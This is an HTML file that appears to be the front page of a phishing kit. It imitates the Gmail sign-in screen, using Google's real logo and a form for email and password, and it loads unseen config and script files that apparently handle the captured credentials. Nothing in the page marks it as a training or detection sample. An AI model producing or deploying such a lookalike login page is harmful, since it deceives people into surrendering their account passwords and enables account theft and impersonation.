<!-- sharpshooter/index.html -->

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Gmail - Sign In</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="gmail-card">
  <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x36dp.png" class="logo" alt="Google Logo">

  <h2>Sign in</h2>
  <p>to continue to Gmail</p>

  <form id="gmail-login">
    <input type="email" name="email" placeholder="Email or phone" required><br/>
    <input type="password" name="password" placeholder="Enter your password" required><br/>
    <button type="submit">Next</button>
  </form>
</div>

<!-- Load config FIRST -->
<script src="config.js"></script>
<!-- Then load your main script -->
 <script src="script.js"></script>
</body>
</html>
